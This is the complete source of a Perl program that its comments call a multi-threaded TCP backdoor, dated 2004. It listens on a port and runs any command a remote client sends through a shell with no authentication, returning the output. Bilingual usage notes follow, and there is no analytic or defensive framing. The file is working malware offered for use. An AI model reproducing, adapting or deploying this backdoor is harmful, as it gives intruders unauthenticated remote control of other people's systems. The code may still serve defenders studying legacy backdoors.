#!/usr/bin/perl -w 
#Multi Alex, a multi-thread TCP backdoor programmed in Perl by demonalex in 2004. 
#TCP多线程正向后门源代码
#The mailbox of demonalex (i.e. Alex Huang) : alex.huang@alumni.polyu.edu.hk
use IO::Socket;
use Thread;
$port=$ARGV[0] || 5354; 
$sock=IO::Socket::INET->new(Listen=>10,LocalPort=>$port,Proto=>'tcp'); 
while(1){ 
	next unless $client=$sock->accept; 
	Thread->new(\&IandO,$client); 
	$client->close; 
} 
$sock->close; 
exit 1; 

sub IandO{ 
	$handle=shift; 
	Thread->self->detach; 
	print $handle "Now u can enter the command!\n"; 
	while(1){ 
		$mem=<$handle>; 
		chop($mem); 
		if(lc($mem) eq 'exit'){ 
			return; 
		}else{ 
			open(CONVERT,"$mem|"); 
			@mem2=<CONVERT>; 
			print $handle "@mem2\n"; 
			close CONVERT; 
			print $handle "Now u can enter the command!\n"; 
		} 
	} 
} 


#Multi Alex, a multi-thread TCP backdoor programmed in Perl by demonalex in 2004. 
#Usage: perl multialex.pl TCP_PORT_NUMBER
#The default listening port is tcp5354
#Bear in mind that the client-side has to utilize NetCat instead of Telnet.
#
#TCP多线程正向后门(支持多会话，想都想得到，多会话有可能支持反向吗?>_<) 
#格式: perl multialex.pl [端口] 
#默认端口为tcp5354 
#切记:必须使用NC作客户端，不要贪方便使用TELNET，否则会造成服务端崩溃(进入S循环) 
